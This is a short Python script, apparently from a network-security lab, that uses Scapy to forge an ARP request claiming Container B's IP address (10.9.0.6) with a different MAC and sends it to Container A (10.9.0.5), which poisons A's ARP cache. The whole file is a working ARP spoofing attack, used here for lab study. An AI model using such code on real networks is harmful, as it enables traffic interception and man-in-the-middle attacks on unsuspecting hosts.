#!/usr/bin/env python3
from scapy.all import * 
import time

IP_CONTAINER_B= "10.9.0.6"
IP_CONTAINER_A= "10.9.0.5"


MAC_V_real = "02:42:0a:09:00:69"
IP_T= "10.9.0.105"
MAC_T_fake = "aa:bb:cc:dd:ee:ff"

# Constructing ARP Request packet
ether = Ether (src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff") 

print("Sending to Container A")

arp = ARP (psrc = IP_CONTAINER_B, hwsrc =MAC_V_real, pdst=IP_CONTAINER_A)
arp.op = 1 # Request
frame = ether/arp 
sendp (frame)
